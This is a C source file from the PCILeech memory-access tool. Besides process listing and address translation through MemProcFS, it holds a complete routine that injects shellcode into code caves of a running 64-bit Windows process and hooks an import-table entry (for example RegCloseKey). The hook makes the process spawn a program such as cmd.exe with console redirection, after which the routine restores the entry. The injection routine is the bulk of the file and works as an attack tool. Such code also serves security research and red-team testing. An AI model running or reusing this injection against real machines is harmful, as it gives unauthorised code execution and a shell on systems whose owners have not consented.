// umd.c : implementation related to various user-mode functionality supported
//         by MemProcFS / vmm.dll integration.
//
// (c) Ulf Frisk, 2019-2020
// Author: Ulf Frisk, pcileech@frizk.net
//
#include "umd.h"
#include <stdio.h>
#ifdef WIN32
#include "executor.h"
#include "util.h"
#include <vmmdll.h>
#include "vmmx.h"

int UmdCompare32(const void* a, const void* b)
{
    return *(int*)a - *(int*)b;
}

/*
* List all processes in the target system memory by using the MemProcFS integration.
*/
VOID Action_UmdPsList()
{
    QWORD i, cbProcInfo, cPIDs = 0x1000;
    PDWORD pdwPIDs = NULL;
    PVMMDLL_PROCESS_INFORMATION pProcInfo = NULL;
    // 1: Initialize MemProcFS/vmm.dll
    if(!(pdwPIDs = LocalAlloc(LMEM_ZEROINIT, cPIDs * sizeof(DWORD)))) { goto fail; }
    if(!(pProcInfo = LocalAlloc(0, sizeof(VMMDLL_PROCESS_INFORMATION)))) { goto fail; }
    if(!Vmmx_Initialize(FALSE, FALSE)) {
        printf("UMD: Failed initializing required MemProcFS/vmm.dll\n");
        goto fail;
    }
    // 2: List processes and iterate over result
    if(!VMMDLL_PidList(pdwPIDs, &cPIDs)) {
        printf("UMD: Failed list PIDs.\n");
    } else {
        qsort(pdwPIDs, cPIDs, sizeof(DWORD), UmdCompare32);
        for(i = 0; i < cPIDs; i++) {
            ZeroMemory(pProcInfo, sizeof(VMMDLL_PROCESS_INFORMATION));
            pProcInfo->magic = VMMDLL_PROCESS_INFORMATION_MAGIC;
            pProcInfo->wVersion = VMMDLL_PROCESS_INFORMATION_VERSION;
            cbProcInfo = sizeof(VMMDLL_PROCESS_INFORMATION);
            if(VMMDLL_ProcessGetInformation(pdwPIDs[i], pProcInfo, &cbProcInfo)) {
                printf("  %6i %s %s\n", pProcInfo->dwPID, pProcInfo->win.fWow64 ? "32" : "  ", pProcInfo->szName);
            }
        }
    }
    Vmmx_Close();
fail:
    LocalFree(pdwPIDs);
    LocalFree(pProcInfo);
}

/*
* Translate a virtual address into a physical address for a given process id (pid).
*/
VOID Action_UmdPsVirt2Phys()
{
    QWORD pa, cbProcInfo;
    VMMDLL_PROCESS_INFORMATION oProcInfo;
    // 1: Initialize MemProcFS/vmm.dll
    if(!Vmmx_Initialize(FALSE, FALSE)) {
        printf("UMD: Failed initializing required MemProcFS/vmm.dll\n");
        return;
    }
    // 2: Retrieve process name and translate virtual to physical address
    ZeroMemory(&oProcInfo, sizeof(VMMDLL_PROCESS_INFORMATION));
    oProcInfo.magic = VMMDLL_PROCESS_INFORMATION_MAGIC;
    oProcInfo.wVersion = VMMDLL_PROCESS_INFORMATION_VERSION;
    cbProcInfo = sizeof(VMMDLL_PROCESS_INFORMATION);
    if(!VMMDLL_ProcessGetInformation((DWORD)ctxMain->cfg.qwDataIn[0], &oProcInfo, &cbProcInfo)) {
        printf("UMD: Failed retrieving information for PID: %lli\n", ctxMain->cfg.qwDataIn[0]);
        printf("     SYNTAX: pcileech psvirt2phys -0 <pid> -1 <virtual_address>\n");
        goto fail;
    }
    if(!VMMDLL_MemVirt2Phys((DWORD)ctxMain->cfg.qwDataIn[0], ctxMain->cfg.qwDataIn[1], &pa)) {
        printf("UMD: Failed translating address 0x%016llx for process %s (%lli)\n", ctxMain->cfg.qwDataIn[1], oProcInfo.szName, ctxMain->cfg.qwDataIn[0]);
        printf("     SYNTAX: pcileech psvirt2phys -0 <pid> -1 <virtual_address>\n");
        goto fail;
    }
    printf("%s (%lli) 0x%016llX (virtual) -> 0x%016llX (physical)\n", oProcInfo.szName, ctxMain->cfg.qwDataIn[0], ctxMain->cfg.qwDataIn[1], pa);
fail:
    Vmmx_Close();
}

// struct shared with wx64_umd_exec_c.c
typedef struct tdUMD_EXEC_CONTEXT_LIMITED {
    CHAR fCMPXCHG;
    CHAR fEnableConsoleRedirect;            // config value set by pcileech
    CHAR fThreadIsActive;
    CHAR fStatus;
    DWORD dwFlagsCreateProcessA;            // config value set by pcileech
    QWORD qwDEBUG;
    QWORD pInfoIn;
    QWORD pInfoOut;
    HANDLE hInWrite;
    HANDLE hOutRead;
    HANDLE hOutWriteCP;
    HANDLE hInReadCP;
    HANDLE hProcessHandle;
    struct {                                // config value set by pcileech
        QWORD CloseHandle;
        QWORD CreatePipe;
        QWORD CreateProcessA;
        QWORD CreateThread;
        QWORD GetExitCodeProcess;
        QWORD ReadFile;
        QWORD Sleep;
        QWORD WriteFile;
        QWORD LocalAlloc;
    } fn;
    CHAR szProcToStart[MAX_PATH];           // config value set by pcileech
} UMD_EXEC_CONTEXT_LIMITED, *PUMD_EXEC_CONTEXT_LIMITED;

/*
* A Basic Usermode shellcode injection technique leveraging read-only analysis
* functionality using the MemProcFS API to identify injection points and also
* functions that the injected shellcode uses.
* If all prerequisites are met then the MemProcFS API is used to write the
* shellcode into the virtual memory of a specific process (technically into
* the backing physical page if it's shared - so be careful!).
* Future plan is to expand in this injection functionality to make it easier
* to use and more like the more versatile KMD functionality...
*/
VOID UmdWinExec()
{
    BOOL result;
    WCHAR wszModuleName[16];
    DWORD cbExec = 0;
    BYTE pbExec[0x500], pbPage[0x1000] = { 0 };
    DWORD i, dwPID, cSections;
    QWORD vaCodeCave = 0, vaWriteCave = 0;
    PIMAGE_SECTION_HEADER pSections;
    SIZE_T cbProcessInformation;
    VMMDLL_PROCESS_INFORMATION oProcessInformation = { 0 };
    VMMDLL_WIN_THUNKINFO_IAT oThunkInfoIAT = { 0 };
    UMD_EXEC_CONTEXT_LIMITED ctx = { 0 };
    QWORD qwTickCountLimit;
    CHAR szHookBuffer[MAX_PATH] = { 0 };
    LPSTR szHookModule, szHookFunction = NULL;
    //--------------------------------------------------------------------------
    // 1: Retrieve process PID and module/function to hook in the main executable IAT.
    //--------------------------------------------------------------------------
    dwPID = (DWORD)ctxMain->cfg.qwDataIn[0];
    Util_SplitString2(ctxMain->cfg.szHook, '!', szHookBuffer, &szHookModule, &szHookFunction);
    if(!dwPID || !szHookModule[0] || !szHookFunction[0]) {
        printf(
            "UMD: Required aguments are missing - Syntax is:                                \n" \
            "  -0 <pid> -1 <CreateFlags> -2 <ConRedir> -s <ProcessToSpawn> -hook <Module!Fn>\n" \
            "  Example:                                                                     \n" \
            "    pcileech UMD_WINX64_IAT_PSCREATE -0 654 -hook ADVAPI32.dll!RegCloseKey     \n" \
            "    -1 0x08000000 -2 1 -s c : \\windows\\system32\\cmd.exe                     \n");
        return;
    }
    //--------------------------------------------------------------------------
    // 2: Verify process and locate 'IAT inject', r-x 'code cave' and rw- 'config cave'.
    //--------------------------------------------------------------------------
    oProcessInformation.magic = VMMDLL_PROCESS_INFORMATION_MAGIC;
    oProcessInformation.wVersion = VMMDLL_PROCESS_INFORMATION_VERSION;
    cbProcessInformation = sizeof(VMMDLL_PROCESS_INFORMATION);
    if(!VMMDLL_ProcessGetInformation(dwPID, &oProcessInformation, &cbProcessInformation)) {
        printf("UMD: EXEC: Could not retrieve process for PID: %i\n", dwPID);
        return;
    }
    for(i = 0; i < 16; i++) {
        wszModuleName[i] = oProcessInformation.szName[i];
    }
    result = VMMDLL_WinGetThunkInfoIAT(dwPID, wszModuleName, szHookModule, szHookFunction, &oThunkInfoIAT);
    if(!result) {
        printf("UMD: EXEC: Could not retrieve hook for %s!%s in '%s'\n", szHookModule, szHookFunction, oProcessInformation.szName);
        return;
    }
    if(!oThunkInfoIAT.fValid || oThunkInfoIAT.f32) {
        printf("UMD: EXEC: Could not retrieve valid hook in 64-bit process.\n");
        return;
    }
    if(!VMMDLL_ProcessGetSections(dwPID, wszModuleName, NULL, 0, &cSections) || !cSections) {
        printf("UMD: EXEC: Could not retrieve sections #1 for '%S'\n", wszModuleName);
        return;
    }
    pSections = (PIMAGE_SECTION_HEADER)LocalAlloc(LMEM_ZEROINIT, cSections * sizeof(IMAGE_SECTION_HEADER));
    if(!pSections || !VMMDLL_ProcessGetSections(dwPID, wszModuleName, pSections, cSections, &cSections) || !cSections) {
        printf("UMD: EXEC: Could not retrieve sections #2 for '%S'\n", wszModuleName);
        return;
    }
    for(i = 0; i < cSections; i++) {
        if(!vaCodeCave && (pSections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && ((pSections[i].Misc.VirtualSize & 0xfff) < (0x1000 - sizeof(pbExec)))) {
            vaCodeCave = VMMDLL_ProcessGetModuleBase(dwPID, wszModuleName) + ((pSections[i].VirtualAddress + pSections[i].Misc.VirtualSize + 0xfff) & ~0xfff) - sizeof(pbExec);
            if(!VMMDLL_MemReadPage(dwPID, vaCodeCave & ~0xfff, pbPage)) {
                vaCodeCave = 0;     // read test failed!
            }
        }
        if(!vaWriteCave && (pSections[i].Characteristics & IMAGE_SCN_MEM_WRITE) && ((pSections[i].Misc.VirtualSize & 0xfff) < (0x1000 - sizeof(ctx)))) {
            vaWriteCave += VMMDLL_ProcessGetModuleBase(dwPID, wszModuleName) + ((pSections[i].VirtualAddress + pSections[i].Misc.VirtualSize + 0xfff) & ~0xfff) - sizeof(ctx);
            if(!VMMDLL_MemReadPage(dwPID, vaWriteCave & ~0xfff, pbPage)) {
                vaWriteCave = 0;     // read test failed!
            }
        }
    }
    if(!vaCodeCave || !vaWriteCave) {
        if(!vaCodeCave) {
            printf("UMD: EXEC: Could not locate suitable code cave in '%S'\n", wszModuleName);
        }
        if(!vaWriteCave) {
            printf("UMD: EXEC: Could not locate suitable write cave in '%S'\n", wszModuleName);
        }
        return;
    }
    //------------------------------------------------
    // 3: Prepare Inject
    //------------------------------------------------
    // prepare shellcode (goes into r-x section)
    Util_ParseHexFileBuiltin("DEFAULT_WINX64_UMD_EXEC", pbExec, sizeof(pbExec), &cbExec);
    *(PQWORD)(pbExec + 0x08) = vaWriteCave;
    *(PQWORD)(pbExec + 0x10) = oThunkInfoIAT.vaFunction;
    // prepare configuration data (goes into rw- section)
    ctx.qwDEBUG = 0;
    ctx.fn.CloseHandle = VMMDLL_ProcessGetProcAddress(dwPID, L"kernel32.dll", "CloseHandle");
    ctx.fn.CreatePipe = VMMDLL_ProcessGetProcAddress(dwPID, L"kernel32.dll", "CreatePipe");
    ctx.fn.CreateProcessA = VMMDLL_ProcessGetProcAddress(dwPID, L"kernel32.dll", "CreateProcessA");
    ctx.fn.CreateThread = VMMDLL_ProcessGetProcAddress(dwPID, L"kernel32.dll", "CreateThread");
    ctx.fn.GetExitCodeProcess = VMMDLL_ProcessGetProcAddress(dwPID, L"kernel32.dll", "GetExitCodeProcess");
    ctx.fn.LocalAlloc = VMMDLL_ProcessGetProcAddress(dwPID, L"kernel32.dll", "LocalAlloc");
    ctx.fn.ReadFile = VMMDLL_ProcessGetProcAddress(dwPID, L"kernel32.dll", "ReadFile");
    ctx.fn.Sleep = VMMDLL_ProcessGetProcAddress(dwPID, L"kernel32.dll", "Sleep");
    ctx.fn.WriteFile = VMMDLL_ProcessGetProcAddress(dwPID, L"kernel32.dll", "WriteFile");
    strcpy_s(ctx.szProcToStart, MAX_PATH - 1, ctxMain->cfg.szInS);
    ctx.dwFlagsCreateProcessA = (DWORD)ctxMain->cfg.qwDataIn[1];
    ctx.fEnableConsoleRedirect = ctxMain->cfg.qwDataIn[2] ? 1 : 0;
    //------------------------------------------------
    // 4: Inject & Hook
    //------------------------------------------------
    printf("UMD: EXEC: Injecting code and configuration data into process %S\n", wszModuleName);
    printf("           IAT Hook : %s!%s at 0x%llx [0x%llx]\n", szHookModule, szHookFunction, oThunkInfoIAT.vaThunk, oThunkInfoIAT.vaFunction);
    VMMDLL_MemWrite(dwPID, vaWriteCave, (PBYTE)&ctx, sizeof(UMD_EXEC_CONTEXT_LIMITED));
    VMMDLL_MemWrite(dwPID, vaCodeCave, pbExec, sizeof(pbExec));
    VMMDLL_MemWrite(dwPID, oThunkInfoIAT.vaThunk, (PBYTE)&vaCodeCave, 8);
    //------------------------------------------------
    // 5: Wait for execution
    //------------------------------------------------
    printf("           Waiting for execution ...\n");
    qwTickCountLimit = GetTickCount64() + 15 * 1000;    // wait for 15s max
    while(TRUE) {
        if(qwTickCountLimit < GetTickCount64()) { break; }
        if(!VMMDLL_MemReadEx(dwPID, vaWriteCave, (PBYTE)&ctx, sizeof(UMD_EXEC_CONTEXT_LIMITED), NULL, VMMDLL_FLAG_NOCACHE)) { break; }
        if(ctx.fStatus) { break; }
        Sleep(10);
    }
    if(!ctx.fStatus) {
        printf("           FAILED! Error or Timeout after 15s.\n");
    } else {
        Sleep(10);
        if(ctx.pInfoIn && ctx.pInfoOut) {
            VMMDLL_ConfigSet(VMMDLL_OPT_REFRESH_ALL, 0);     // force refresh - shellcode allocations may have updated virtual memory map (page tables).
            printf("           Succeeded - Connecting to console ...\n");
            Exec_ConsoleRedirect(ctx.pInfoIn, ctx.pInfoOut, dwPID);
        } else {
            printf("           Succeeded.\n");
        }
    }
    //------------------------------------------------
    // 6: Restore
    //------------------------------------------------
    printf("           Restoring...\n");
    ZeroMemory(pbExec, sizeof(pbExec));
    ZeroMemory(&ctx, sizeof(UMD_EXEC_CONTEXT_LIMITED));
    VMMDLL_MemWrite(dwPID, oThunkInfoIAT.vaThunk, (PBYTE)&oThunkInfoIAT.vaFunction, 8);
    Sleep(10);
    VMMDLL_MemWrite(dwPID, vaCodeCave, pbExec, sizeof(pbExec));
    VMMDLL_MemWrite(dwPID, vaWriteCave, (PBYTE)&ctx, sizeof(UMD_EXEC_CONTEXT_LIMITED));
}

VOID ActionExecUserMode()
{
    if(!Vmmx_Initialize(FALSE, FALSE)) {
        printf("UMD: Failed initializing required MemProcFS/vmm.dll\n");
        return;
    }
    if(0 == _stricmp(ctxMain->cfg.szShellcodeName, "UMD_WINX64_IAT_PSEXEC")) {
        UmdWinExec();
    } else {
        printf("UMD: Not found.\n");
    }
    Vmmx_Close();
}

#endif /* WIN32 */
#ifdef LINUX

VOID Action_UmdPsList()
{
    printf("UMD: Not supported on Linux - require: Windows-only MemProcFS/vmm.dll\n");
}

VOID Action_UmdPsVirt2Phys()
{
    printf("UMD: Not supported on Linux - require: Windows-only MemProcFS/vmm.dll\n");
}

VOID ActionExecUserMode()
{
    printf("UMD: Not supported on Linux - require: Windows-only MemProcFS/vmm.dll\n");
}

#endif /* LINUX */
